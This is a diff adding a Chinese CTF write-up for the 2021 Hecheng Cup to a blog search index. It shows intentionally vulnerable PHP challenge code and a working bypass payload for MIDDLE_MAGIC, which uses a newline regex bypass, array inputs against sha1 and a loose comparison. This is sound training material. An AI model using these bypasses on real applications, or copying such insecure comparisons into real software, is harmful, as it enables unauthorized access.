@@ -19060,6 +19060,94 @@ virtual
   <entry>
     <title>鹤城杯2021</title>
     <url>/2021/10/08/he-cheng-bei-2021/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h1 id="MIDDLE-MAGIC"><a href="#MIDDLE-MAGIC" class="headerlink" title="MIDDLE_MAGIC"></a>MIDDLE_MAGIC</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token string">"./flag.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token string">"./result.php"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token string">'${1}&lt;!-- filtered -->${2}'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"here is level 2"</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                    <span class="token keyword">echo</span> <span class="token string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">// START FORM PROCESSING    </span>
+                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                    <span class="token keyword">echo</span> <span class="token string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+                            <span class="token keyword">echo</span> <span class="token string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                        <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">echo</span> <span class="token string">"you never beat me!"</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                    <span class="token keyword">else</span><span class="token punctuation">{</span>
+                        <span class="token keyword">echo</span> <span class="token string">"out"</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">else</span><span class="token punctuation">{</span>
+
+                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token comment" spellcheck="true">// perform validations on the form data</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">else</span><span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">else</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">'nonono!'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token delimiter">?></span> </code></pre>
+<ul>
+<li>%0a绕过preg_replace</li>
+<li>数组绕过sha1</li>
+<li>若比较=0绕过json_decode</li>
+</ul>
+<p><strong>payload</strong></p>
+<pre><code>?aaa=%0apass_the_level_1#
+POST:
+admin[]=1&amp;root_pwd[]=2&amp;level_3={"result":0}</code></pre>
+<h1 id="EASYP"><a href="#EASYP" class="headerlink" title="EASYP"></a>EASYP</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+<span class="token keyword">include</span> <span class="token string">'utils.php'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$guess</span> <span class="token operator">===</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong. Try Again'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/utils\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/show_source/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"hacker :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'show_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span> </code></pre>
+]]></content>
   </entry>
 </search>
